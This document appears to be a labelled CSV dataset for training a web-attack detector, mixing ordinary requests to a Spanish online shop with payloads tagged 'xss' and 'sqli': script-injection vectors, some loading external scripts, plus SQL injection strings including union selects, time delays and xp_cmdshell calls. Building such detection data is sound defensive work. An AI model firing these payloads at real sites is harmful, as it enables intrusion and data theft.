payload,type
publico/miembros.jsp,normal
castil de vela,normal
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=100&cantidad=65&B1=A%F1adir+al+carrito,normal
miembros/imagenes/ogono.jpg,normal
index.jsp,normal
"<object type=""text/x-scriptlet"" data=""http://jsfiddle.net/XLE63/ ""></object>",xss
"<IMG STYLE=""xss:expr/*XSS*/ession(javascript:alert(1))"">",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
3.99E+14,normal
global/estilos.css,normal
enardecedora,normal
<![<!--]]<script>document.vulnerable=true;//--></script>,xss
imagenes/logo.gif,normal
global/estilos.css,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
miembros/fotos.jsp,normal
publico/caracteristicas.jsp?id=2,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
8318,normal
admin') or ('1'='1'--,sqli
ibero saborit,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",xss
7.84E+15,normal
clodettes_pierson@repretexbcn.ml,normal
canut escriba,normal
publico/registro.jsp?modo=registro&login=karels&password=destete&nombre=Neleo&apellidos=Tarrats+Steiert&email=matterstock%409horas.np&dni=60380887E&direccion=General+Ricardos+187+&ciudad=Santa+Cruz+de+la+Palma&cp=31271&provincia=Palencia&ntc=7910538337072686&B1=Registrar,normal
<;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javascript:alert(';XSS';)>;<;/OBJECT>;,xss
global/menum.jsp,normal
<img src=`%00`&NewLine; onerror=alert(1)&NewLine;,xss
&#x3C;,xss
nicole-meyer@creacionesdolcevita.us,normal
&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
michigan,normal
"&lt;IMG SRC=\""   javascript&#058;alert('XSS');\""&gt;",xss
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=96&B1=A%F1adir+al+carrito,normal
<script ^__^>alert(String.fromCharCode(49))</script ^__^,xss
//*,sqli
28194,normal
&lt;IMG SRC=javascript&#058;alert('XSS')&gt;,xss
imagenes/cmenbul.gif,normal
hembrick,normal
"UE1nk: select * from users where id=1 union select 1a,banner from v$version where rownum=1 -- 1",sqli
miembros/imagenes/zarauz.jpg,normal
"<script src=""data:text/javascript,alert(1)""></script>",xss
7613,normal
miembros/salir.jsp,normal
imagenes/cmenbul.gif,normal
"perl -e 'print \""<IMG SRC=java\0script:alert(\""XSS\"")>\"";' > out",xss
cotizada,normal
ushiahua,normal
imagenes/nuestratierra.jpg,normal
kangning,normal
publico/carrito.jsp,normal
almagrar,normal
"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",xss
"UEvs: select * from users where id=1 union select @ $$,version() -- 1",sqli
"s(UEv: select * from users where id=1 or 1#""( union select null,version() -- 1",sqli
6382,normal
),sqli
55235483v,normal
80029600l,normal
miembros/salir.jsp,normal
"calahorra, la",normal
miembros/fotos.jsp,normal
firat6,normal
miembros/editar.jsp?modo=registro&login=tahsin&password=desempulgadura&nombre=Angilberto&apellidos=Urruch%F9a+Comallonga&email=monkman%40encuentrodominios.org&dni=45054784S&direccion=Paseo+Canteras+75+&ciudad=Cartaya&cp=05198&provincia=Vizcaya&ntc=3616118295208716&B1=Registrar,normal
publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=61&B1=A%F1adir+al+carrito,normal
38036492n,normal
publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=36&B1=A%F1adir+al+carrito,normal
imagenes/nuestratierra.jpg,normal
miembros/imagenes/zarauz.jpg,normal
lacey@bwds.mp,normal
publico/carrito.jsp,normal
imagenes/2.gif,normal
"<input/onmouseover=""javaSCRIPT&colon;confirm&lpar;1&rpar;""",xss
"&lt;IMG SRC='vbscript&#058;msgbox(\""XSS\"")'&gt;",xss
5856,normal
bosier@opel-e-flex.bn,normal
0a0t4d2r,normal
"<a href=""\xE2\x80\x8Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
9.45E+15,normal
"<a href=""\x18javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",xss
doortje,normal
"<form><button formaction=""javascript:javascript:alert(1)"">X",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
mohandas,normal
50174,normal
"<script/src=data:,alert()>",xss
"<a href=""\xE2\x80\x82javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
totino,normal
miembros/imagenes/castro.jpg,normal
miembros/fotos.jsp,normal
miembros/editar.jsp?modo=registro&login=forslund&password=im%24ponderable&nombre=Ravid&apellidos=Bonany+Lambarri&email=lightnin%40grupodescansoyhogar.web&dni=70679983V&direccion=Calle+Barrio+Villayuda+169%2C+&ciudad=Ari%F1o&cp=08170&provincia=Segovia&ntc=0664227829030755&B1=Registrar,normal
"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>",xss
index.jsp,normal
2.30E+15,normal
&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;,xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
braa,normal
miembros/imagenes/zarauz.jpg,normal
imagenes/3.gif,normal
global/estilos.css,normal
reis,normal
publico/caracteristicas.jsp?id=2,normal
miembros/imagenes/zarauz.jpg,normal
glazer,normal
imagenes/3.gif,normal
&#0060,xss
on.&1: select * from users where id=1 %$ . or 1=1 -- 1,sqli
1120,normal
4881,normal
publico/productos.jsp,normal
kangelis,normal
4.36E+15,normal
*ayustar,normal
"<IFRAME width=""420"" height=""315"" frameborder=""0"" onload=""alert(document.cookie)""></IFRAME>",xss
8.96E+15,normal
"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",xss
publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85&cantidad=4&B1=A%F1adir+al+carrito,normal
global/titulo.jsp,normal
bride,normal
imagenes/3.gif,normal
".UEvk: select * from users where id=1. union select null,banner from v$version where rownum=1 -- 1",sqli
index.jsp,normal
imagenes/nuestratierra.jpg,normal
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss
"<IMG SRC=x onmouseup=""alert(String.fromCharCode(88,83,83))"">",xss
global/estilos.css,normal
49830,normal
guntekin,normal
"""`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>",xss
4631,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"<body onkeyup body onkeyup=""javascript:javascript:alert(1)""></body onkeyup>",xss
tremewan,normal
anything' or 'x'='x,sqli
"guadalajara, 101 4-e",normal
index.jsp,normal
"<BODY BACKGROUND=""javascript:alert('XSS')"">",xss
publico/pagar.jsp?modo=insertar&precio=7698&B1=Pasar+por+caja,normal
publico/registro.jsp?modo=registro&login=crosby&password=di874i0&nombre=Beda&apellidos=Soms+Gallaga&email=tyrell%40masqueclases.sr&dni=37871926B&direccion=Calle+Juan+Sebastian+Elcano%2C+157+11%3FB&ciudad=Buenavista&cp=39660&provincia=Palencia&ntc=5032561795933103&B1=Registrar,normal
"<EMBED SRC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""></EMBED>",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
imagenes/2.gif,normal
8.08E+15,normal
"s&.oU: select * from users where id='1' or \.<\ union select 1,@@VERSION -- 1'",sqli
imagenes/3.gif,normal
miembros/index.jsp,normal
imagenes/3.gif,normal
"&lt;IMG SRC=\""jav&#x09;ascript&#058;alert('XSS');\""&gt;",xss
fortuny goyenaga,normal
imagenes/nuestratierra.jpg,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
publico/autenticar.jsp?modo=entrar&login=pittman&pwd=a73p3i4&remember=off&B1=Entrar,normal
miembros/imagenes/zarauz.jpg,normal
imagenes/2.gif,normal
'; exec master..xp_cmdshell 'ping 172.10.1.255'--,sqli
"ignacio aldecoa, 30, 6h",normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
imagenes/2.gif,normal
7.40E+15,normal
javascript:alert%281%29;,xss
"' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));",sqli
canal saracho,normal
imagenes/logo.gif,normal
&#x003c,xss
a' ,sqli
global/menum.jsp,normal
miembros/fotos.jsp,normal
"s?UE1: select * from users where id=1 or 1#""? union select 1,version() -- 1",sqli
coe,normal
imagenes/cmenbul.gif,normal
septingentsima,normal
miembros/salir.jsp,normal
miembros/salir.jsp,normal
publico/carrito.jsp,normal
&lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;,xss
"calle dinamarca 14,",normal
miembros/fotos.jsp,normal
2.41E+15,normal
publico/autenticar.jsp?modo=entrar&login=caryn&pwd=oliv_icultora&remember=on&B1=Entrar,normal
global/titulo.jsp,normal
"<IMG SRC=x oncopy=""alert(String.fromCharCode(88,83,83))"">",xss
miembros/editar.jsp?modo=registro&login=dougall&password=bisonte&nombre=Olalia&apellidos=Molas+Madan&email=landesman%40cohel.mw&dni=95690740E&direccion=Sargento+Luna%2C+184+&ciudad=Villagalijo&cp=22571&provincia=Girona&ntc=9687551942893066&B1=Registrar,normal
"<IMG SRC=x ontoggle=""alert(String.fromCharCode(88,83,83))"">",xss
global/menum.jsp,normal
truncate,sqli
96639593x,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
miembros/imagenes/castro.jpg,normal
8.51E+15,normal
miembros/imagenes/ogono.jpg,normal
santibez de ecla,normal
imagenes/3.gif,normal
"<XSS STYLE=""xss:expression(javascript:alert(1))"">",xss
global/menum.jsp,normal
39960501w,normal
publico/miembros.jsp,normal
pingshen,normal
publico/registro.jsp?modo=registro&login=caleta&password=carminante&nombre=Reinaldo&apellidos=Homs+Breither&email=patric_congregation%40annoyanc.zr&dni=54180440F&direccion=Calle+Jabera%2C+27%2C+&ciudad=Fuentes+Calientes&cp=47185&provincia=Valencia&ntc=9828908323300958&B1=Registrar,normal
publico/autenticar.jsp?modo=entrar&login=nuttall&pwd=5exas9labo&remember=off&B1=Entrar,normal
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85&cantidad=39&B1=A%F1adir+al+carrito,normal
publico/miembros.jsp,normal
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss
"ABC<div style=""x\x3Aexpression(javascript:alert(1)"">DEF",xss
"c/ el jacinto, 132,",normal
"s&(1): select * from users where id='1' or (1)=1 union select 1,banner from v$version where rownum=1 -- 1'",sqli
63298862x,normal
uriz carmona,normal
noon&: select * from users where id=1 + $+%$ or 1=1 -- 1,sqli
imagenes/1.gif,normal
"<img src=x onerror=\x10""javascript:alert(1)"">",xss
carretera 200 hasta km. 1 barra de mio 175,normal
pineda de la sierra,normal
imagenes/cmenbul.gif,normal
"s&1oo: select * from users where id='1' or 1^=1 union select 1,banner from v$version where rownum=1 -- 1'",sqli
baqu,normal
dyck,normal
"`""'><img src=xxx:x \x0Donerror=javascript:alert(1)>",xss
--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->,xss
imagenes/3.gif,normal
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100&cantidad=49&B1=A%F1adir+al+carrito,normal
hache6,normal
5.89E+15,normal
supersticin,normal
global/menum.jsp,normal
tierra 17,normal
"praza san antonio da florida, 27,",normal
imagenes/nuestratierra.jpg,normal
"s:UEf: select * from users where id=1 or 1#"": union select version(),version() -- 1",sqli
20001,normal
publico/carrito.jsp,normal
miembros/imagenes/castro.jpg,normal
&lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt;,xss
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\,xss
miembros/imagenes/zarauz.jpg,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
hoyo higueron 32 3-f,normal
imagenes/cmenbul.gif,normal
"<IMG SRC=x onloadstart=""alert(String.fromCharCode(88,83,83))"">",xss
miscelnea,normal
imagenes/3.gif,normal
global/titulo.jsp,normal
publico/miembros.jsp,normal
1.03E+15,normal
imagenes/cmenbul.gif,normal
"<a href=""\x1Cjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
borzani jordan,normal
global/creditos.jsp,normal
"""`'><script>\x00javascript:alert(1)</script>",xss
publico/carrito.jsp,normal
66702102d,normal
"<img \x47src=x onerror=""javascript:alert(1)"">",xss
&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,xss
"<A HREF=""htt p://6 6.000146.0x7.147/"">XSS</A>",xss
"sn(s: select * from users where id=1 or ""$("" or 1=1 -- 1",sqli
miembros/salir.jsp,normal
rix.piljeckaja@waterflyesp.be,normal
publico/productos.jsp,normal
"<IMG SRC=""javascript:javascript:alert(1)""",xss
adahuesca,normal
"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",xss
<h1><font color=blue>hellox worldss</h1>,xss
publico/caracteristicas.jsp?id=1,normal
global/estilos.css,normal
miembros/imagenes/ogono.jpg,normal
"<iframe style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",xss
"<a href=""javas\x0Bcript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
publico/caracteristicas.jsp?id=2,normal
"<script src=""\\%(jscript)s""></script>",xss
global/menum.jsp,normal
"<a href=""\x09javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
miembros/imagenes/ogono.jpg,normal
global/menum.jsp,normal
miembros/salir.jsp,normal
"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;""></BODY></HTML>",xss
miembros/editar.jsp?modo=registro&login=ramani&password=3St59Et982&nombre=No%E9&apellidos=Madan+Deluca&email=mcgovern-boxter%40buscadordevideos.ag&dni=59041581Y&direccion=Antonio+Juez+67+3%3FA&ciudad=Villava%2FAtarrabia&cp=45221&provincia=Guadalajara&ntc=0512154682216503&B1=Registrar,normal
kumushalieva@hiperbarcelona.ly,normal
publico/miembros.jsp,normal
imagenes/3.gif,normal
global/estilos.css,normal
"calle juan sebastian elcano, 157 11?b",normal
"<style>@im\port'\ja\vasc\ript:alert(\""XSS\"")';</style>",xss
aguistin,normal
al769i4,normal
desmerecer,normal
imagenes/3.gif,normal
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser,xss
"s&no.: select * from users where id='1' or $<\. union select 1,@@VERSION -- 1'",sqli
o(n)&: select * from users where id=1 %($) or 1=1 -- 1,sqli
duilio,normal
hoeflich@movil-google.cx,normal
"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>",xss
publico/miembros.jsp,normal
"<div id=d><div style=""font-family:'sans\27\3B color\3Ared\3B'"">X</div></div> <script>with(document.getElementById(""d""))innerHTML=innerHTML</script>",xss
pa24dan3cea,normal
miembros/fotos.jsp,normal
miembros/fotos.jsp,normal
ayyuce,normal
boci+o,normal
publico/registro.jsp?modo=registro&login=franka&password=V5482%2BCT0&nombre=Hossana&apellidos=Decour+Raichs&email=cou%40tradedeficit.pg&dni=81451206H&direccion=Calle+Joan+Salvat+Papasseit+S%2FN%2C+&ciudad=Cella&cp=50408&provincia=Badajoz&ntc=5349288055787524&B1=Registrar,normal
9195,normal
imagenes/3.gif,normal
publico/pagar.jsp?modo=insertar&precio=7427&B1=Confirmar,normal
publico/productos.jsp,normal
"<video onerror=""javascript:javascript:alert(1)""><source>",xss
10702,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
dillard,normal
0a3ramplar,normal
cherwin4@xavipetit.mu,normal
global/estilos.css,normal
filis,normal
"<table background=""javascript:javascript:alert(1)"">",xss
miembros/salir.jsp,normal
index.jsp,normal
miembros/salir.jsp,normal
<script\x09>javascript:alert(1)</script>,xss
3820,normal
miembros/editar.jsp?modo=registro&login=maggee&password=m1n*6848&nombre=Mar%EDa+Bel%E9n&apellidos=Jorge+Paquirachi&email=bartlett%40waterflyesp.eh&dni=82474321R&direccion=Calle+Silvestre+Peromarta+60%2C+&ciudad=Santa+Mar%EDa+de+las+Hoyas&cp=26213&provincia=Girona&ntc=6708008477094577&B1=Registrar,normal
imagenes/logo.gif,normal
publico/registro.jsp?modo=registro&login=ramiz&password=garantir&nombre=Enrico&apellidos=Vallb%F3+Olmos&email=pangborn%40informex.me&dni=07485924E&direccion=C%2F+Las+Chumberas%2C+38%2C+&ciudad=Medina+de+Rioseco&cp=40320&provincia=Segovia&ntc=9431159156347522&B1=Registrar,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
index.jsp,normal
publico/pagar.jsp?modo=insertar&precio=1882&B1=Confirmar,normal
<body oninput=javascript:alert(1)><input autofocus>,xss
publico/autenticar.jsp?modo=entrar&login=lauze&pwd=retenIdAmEnte&remember=on&B1=Entrar,normal
rowen,normal
"<IMG SRC=x ondragover=""alert(String.fromCharCode(88,83,83))"">",xss
cha$9i74r0,normal
28900,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"pealara, 87",normal
"<body onload body onload=""javascript:javascript:alert(1)""></body onload>",xss
methi,normal
imagenes/nuestratierra.jpg,normal
3146,normal
47761an0i59r,normal
'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --,sqli
miembros/index.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
steinfeld@multireform.sg,normal
publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100&cantidad=9&B1=A%F1adir+al+carrito,normal
imagenes/3.gif,normal
"sUEo\: select * from users where id='1' union select +\#,@@VERSION -- 1'",sqli
"<;IMG SRC="";jav&#x09;ascript:alert(';XSS';);"";>;",xss
aventino,normal
86168713h,normal
35591968c,normal
imagenes/2.gif,normal
publico/miembros.jsp,normal
publico/pagar.jsp?modo=insertar&precio=676&B1=Confirmar,normal
imagenes/3.gif,normal
17590r,normal
"1c: select * from users where id=11<1# union select 1,version() -- 1",sqli
publico/registro.jsp?modo=registro&login=mallorie&password=ha6agar&nombre=Vinicio&apellidos=Espinoza+Blancarte&email=fischetti.bacall%40players.com.gr&dni=66376502C&direccion=Germanies+18%2C+&ciudad=Itrabo&cp=46660&provincia=Asturias&ntc=2812685253359971&B1=Registrar,normal
4.47E+15,normal
global/estilos.css,normal
global/titulo.jsp,normal
miembros/imagenes/ogono.jpg,normal
"""><img src=x onerror=window.open('https://www.google.com/');>",xss
"1ooUE: select * from users where id=1 + \+*\ union select null,@@VERSION -- 1",sqli
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>,xss
45634,normal
publico/registro.jsp?modo=registro&login=verrilli&password=s9p2212419435.5&nombre=Gianna&apellidos=Bilbao+Calsada&email=moll%40eurograb.ic&dni=88360528W&direccion=C%2F+El+Columpio+13%2C+&ciudad=Kripan&cp=09390&provincia=%C1vila&ntc=7282110162388587&B1=Registrar,normal
publico/miembros.jsp,normal
&<script>document.vulnerable=true;</script>,xss
imagenes/nuestratierra.jpg,normal
mieza,normal
"<;LINK REL="";stylesheet""; HREF="";http://ha.ckers.org/xss.css"";>;",xss
42156,normal
miembros/index.jsp,normal
"<a href=""\xE2\x80\x89javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
rebolledo de la torre,normal
"<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>",xss
andrade escriba,normal
imagenes/cmenbul.gif,normal
mamakos@palodegolf.com.rw,normal
publico/caracteristicas.jsp?id=2,normal
29691,normal
quintanilla del coco,normal
"<DIV STYLE=""width: expression(alert('XSS'));"">",xss
imagenes/logo.gif,normal
11106027v,normal
imagenes/3.gif,normal
publico/miembros.jsp,normal
"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",xss
publico/carrito.jsp,normal
5.57E+15,normal
"<IMG SRC=x ontimeupdate=""alert(String.fromCharCode(88,83,83))"">",xss
3771,normal
publico/autenticar.jsp?modo=entrar&login=claudine&pwd=arrestar&remember=off&B1=Entrar,normal
publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=54&B1=A%F1adir+al+carrito,normal
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>,xss
miembros/imagenes/zarauz.jpg,normal
publico/registro.jsp?modo=registro&login=blenkarn6&password=ADORo&nombre=Gloriano&apellidos=Chayle+Villablanca&email=pawlikowski%40clo2.tw&dni=36844689T&direccion=Carrer+De+Merida+35+8-C&ciudad=Castell%F3+de+Rugat&cp=01193&provincia=Guip%FAzcoa&ntc=4809909158427521&B1=Registrar,normal
06327548h,normal
miembros/fotos.jsp,normal
"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",xss
"sv(s: select * from users where id=1 or ""@("" or 1=1 -- 1",sqli
global/titulo.jsp,normal
imagenes/3.gif,normal
murillo el cuende,normal
budd9,normal
global/creditos.jsp,normal
imagenes/logo.gif,normal
publico/registro.jsp?modo=registro&login=parypa&password=2eSCo63ENti2&nombre=Yaiti&apellidos=Andara+Francino&email=tolan.herlie%40movil-google.mx&dni=77077342H&direccion=Quintana+19%2C+13F&ciudad=Sant+Jordi%2FSan+Jorge&cp=10335&provincia=Madrid&ntc=0945394059491882&B1=Registrar,normal
global/estilos.css,normal
global/estilos.css,normal
25660,normal
"<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>",xss
salhany0,normal
global/titulo.jsp,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"<img src\x13=x onerror=""javascript:alert(1)"">",xss
"s)ns: select * from users where id=1 or "")$"" or 1=1 -- 1",sqli
publico/registro.jsp?modo=registro&login=ava8&password=0u5o&nombre=Ayar&apellidos=Traveria+Morera&email=huebing%40biosoftware.pe&dni=36563093Q&direccion=Carrer+Peru+128%2C+9%3FF&ciudad=Casas+de+Ben%EDtez&cp=10411&provincia=Le%F3n&ntc=4283457945091772&B1=Registrar,normal
"sUEn.: select * from users where id='1' union select $ .,@@VERSION -- 1'",sqli
imagenes/logo.gif,normal
"<style type=""text/javascript"">document.vulnerable=true;</style>",xss
imagenes/logo.gif,normal
publico/caracteristicas.jsp?id=2,normal
imagenes/2.gif,normal
"<style type=""text/css"">BODY{background:url(""javascript:document.vulnerable=true"")}</style>",xss
&#x000003c,xss
per8ebimie0to,normal
"`""'><img src=xxx:x onerror\x0A=javascript:alert(1)>",xss
miembros/fotos.jsp,normal
publico/productos.jsp,normal
"pl. san marcos, 0, 11f",normal
global/estilos.css,normal
8.99E+15,normal
global/estilos.css,normal
"<a href=""\x17javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
barreras de la bandera,normal
index.jsp,normal
"<;LINK REL="";stylesheet""; HREF="";javascript:alert(';XSS';);"";>;",xss
72523597c,normal
miembros/index.jsp,normal
miembros/imagenes/zarauz.jpg,normal
knio,normal
24768,normal
imagenes/3.gif,normal
"<IMG SRC=x ononline=""alert(String.fromCharCode(88,83,83))"">",xss
"<form><a href=""javascript:\u0061lert&#x28;1&#x29;"">X</script><img/*/src=""worksinchrome&colon;prompt&#x28;1&#x29;""/*/onerror='eval(src)'>",xss
"<comment><img src=""</comment><img src=x onerror=javascript:alert(1))//"">",xss
publico/carrito.jsp,normal
braschi_courtneidge@djbroadcast.an,normal
|,sqli
publico/vaciar.jsp?B2=Vaciar+carrito,normal
miembros/fotos.jsp,normal
imagenes/nuestratierra.jpg,normal
publico/pagar.jsp?modo=insertar&precio=6194&B1=Pasar+por+caja,normal
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera},xss
(||6),sqli
"&.onU: select * from users where id=1 or \.<$ union select 1,@@VERSION -- 1",sqli
"<BR SIZE=""&{javascript:alert(1)}"">",xss
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=85&cantidad=22&B1=A%F1adir+al+carrito,normal
"<;IMG SRC=`javascript:alert("";RSnake says, ';XSS';"";)`>;",xss
"c/ elvas 112, 13-a",normal
publico/carrito.jsp,normal
miembros/editar.jsp?modo=registro&login=mu-cheng&password=b4rl942R7&nombre=Saturnina&apellidos=Bediaga&email=schiavelli%40buscadordevideos.mk&dni=30555153K&direccion=C%2F+Arago+194%2C+&ciudad=Endrinal&cp=37541&provincia=Ciudad+Real&ntc=1455691035451783&B1=Registrar,normal
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>,xss
publico/carrito.jsp,normal
"perl -e 'print \""&lt;SCR\0IPT&gt;alert(\\""XSS\\"")&lt;/SCR\0IPT&gt;\"";' &gt; out",xss
global/menum.jsp,normal
brbara,normal
horcajo de montemayor,normal
kostka5@institutoandaluzdelmar.an,normal
88341714w,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
global/menum.jsp,normal
"llosa de ranes, la",normal
miembros/index.jsp,normal
"<div STYLE=""background-image: url(&#1;javascript:document.vulnerable=true;)"">",xss
publico/productos.jsp,normal
imagenes/2.gif,normal
0o380ado6,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
marven,normal
index.jsp,normal
6014,normal
47939000p,normal
imagenes/cmenbul.gif,normal
imokoude@transportesvegasl.et,normal
publico/pagar.jsp?modo=insertar&precio=357&B1=Pasar+por+caja,normal
"<script a="">"" '' SRC=""http://www.securitycompass.com/xss.js""></script>",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
publico/miembros.jsp,normal
claudio iturrieta,normal
keung,normal
tabakov@wdsl.ly,normal
9.54E+15,normal
imagenes/3.gif,normal
miembros/index.jsp,normal
33560,normal
miembros/salir.jsp,normal
"escritor nicolas del paso, 95",normal
global/menum.jsp,normal
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",xss
rodo de la cerda,normal
global/titulo.jsp,normal
&lt;XML SRC=&quot;http://ha.ckers.org/xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;,xss
neugebauer@buscamoto.gw,normal
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
paseo arco del ladrillo 48 10?h,normal
18243165w,normal
miembros/index.jsp,normal
</title><SCRIPT>document.vulnerable=true;</script>,xss
estival,normal
brewton,normal
publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=39&B1=A%F1adir+al+carrito,normal
sant aniol de finestres,normal
publico/pagar.jsp?modo=insertar&precio=3625&B1=Pasar+por+caja,normal
'; exec master..xp_cmdshell,sqli
1212,normal
